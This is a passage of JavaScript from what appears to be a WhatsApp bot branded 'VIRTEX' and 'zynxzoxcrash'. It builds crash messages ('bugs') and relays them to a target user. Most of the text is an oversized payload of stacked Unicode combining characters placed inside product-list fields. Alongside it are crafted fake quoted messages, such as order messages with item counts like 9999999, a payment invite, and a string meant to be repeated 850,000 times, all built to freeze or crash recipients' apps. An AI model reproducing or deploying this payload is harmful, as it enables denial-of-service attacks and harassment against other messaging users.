*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄😈⃟╮.xp`,
        'description': `✳️《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄͙😈⃟╮`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
}), { userJid: target, quoted: kuwoted });
await zynxzo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
//=================================================//
if (!zynxzo.public) {
    if (!m.key.fromMe) return
}
zynxzo.public = true
//=================================================//
const dust = {
    "key": {
        "remoteJid": "status@broadcast",
        "participant": "0@s.whatsapp.net",
        "fromMe": false
    },
    "message": {
        "interactiveMessage": {
            "header": {
                "title": ""
            },
            "body": {
                "text": "《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》"
            },
            "footer": {
                "text": "by - zynxzoxcrash"
            },
            "nativeFlowMessage": {
                "messageParamsJson": "" //.repeat(850000)
            }
        }
    }
}
const troll = {
    key: {
        fromMe: false,
        participant: '0@s.whatsapp.net',
        remoteJid: "status@broadcast"
    },
    message: {
        orderMessage: {
            orderId: "2029",
            thumbnail: null,
            itemCount: 909,
            status: "INQUIRY",
            surface: "CATALOG",
            message: `MsG - ${m.body || m.mtype}`,
            token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
    },
    contextInfo: {
        mentionedJid: m.sender.split,
        forwardingScore: 999,
        isForwarded: true
    }
}
//=================================================//
const qpay = {
    key: {
        remoteJid: '',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: 2
        }
    }
}
//=================================================//
const zets = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2029",
      thumbnail: kosongjpg, //image 0kb
      itemCount: 9999999,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `💬 ${m.body || m.mtype}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: m.sender.split,
    forwardingScore: 999,
    isForwarded: true
  }
};
//=================================================//
const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "❖ Ocha Client - Zynxzoo 💬",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}
//=================================================//
const hobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪